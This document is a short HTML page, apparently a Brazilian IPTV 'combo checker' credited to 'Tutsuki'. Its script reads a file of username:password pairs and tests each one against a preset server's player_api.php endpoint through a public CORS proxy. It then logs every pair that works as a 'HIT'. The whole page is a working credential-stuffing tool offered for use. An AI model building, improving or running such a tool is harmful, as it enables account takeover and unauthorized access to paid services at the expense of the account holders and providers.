<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="utf-8"/>
<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
<title>LUNAR PROJECT</title>
<style>
  body { background: #000; color: #00c38e; font-family: monospace; text-align: center; margin: 0; padding: 10px; }
  .caixa { border: 2px solid #00c38e; padding: 15px; border-radius: 10px; margin: 10px auto; max-width: 500px; background: rgba(0,0,0,0.8); }
  input, button { width: 90%; padding: 10px; margin: 5px; border-radius: 5px; border: 1px solid #00c38e; background: #111; color: #00c38e; font-weight: bold; }
  button { background: #00c38e; color: #000; cursor: pointer; }
  .barra { background: #333; height: 20px; border-radius: 5px; margin: 10px 0; overflow: hidden; }
  .barra-fill { background: #00c38e; width: 0%; height: 100%; transition: 0.3s; }
  #logs { text-align: left; font-size: 12px; height: 150px; overflow-y: auto; border: 1px solid #333; padding: 5px; }
</style>
</head>
<body>
<h1>🌘 LUNAR PROJECT</h1>
<p>BY TUTSUKI</p>

<div class="caixa">
  <input id="combo" type="file" accept=".txt"/>
  <input id="servidor" placeholder="http://exemplo.com:80" type="text" value="http://2025easy.lat:80"/>
  <input id="nick" value="Tutsuki" type="text"/>
  <button onclick="start()">🚀 INICIAR SCAN</button>
</div>

<div class="caixa">
  <div>🔥 HITS: <span id="hCount">0</span></div>
  <div class="barra"><div id="bFill" class="barra-fill"></div></div>
  <div id="logs"></div>
</div>

<script>
let hits = 0;
async function start() {
  const file = document.getElementById('combo').files[0];
  const srv = document.getElementById('servidor').value;
  const logBox = document.getElementById('logs');
  if(!file || !srv) return alert("Selecione o arquivo e o servidor!");
  
  const text = await file.text();
  const linhas = text.split('\n').filter(l => l.includes(':'));
  
  for(let i = 0; i < linhas.length; i++) {
    const [u, p] = linhas[i].trim().split(':');
    let porc = Math.floor(((i + 1) / linhas.length) * 100);
    document.getElementById('bFill').style.width = porc + '%';
    
    try {
      const url = `https://corsproxy.io/?${encodeURIComponent(srv+'/player_api.php?username='+u+'&password='+p)}`;
      const r = await fetch(url);
      const d = await r.json();
      if(d?.user_info?.status === "Active") {
        hits++;
        document.getElementById('hCount').innerText = hits;
        logBox.innerHTML = `✅ HIT: ${u}:${p}<br>` + logBox.innerHTML;
      }
    } catch(e) {}
  }
  alert("Scan finalizado!");
}
</script>
</body>
</html>
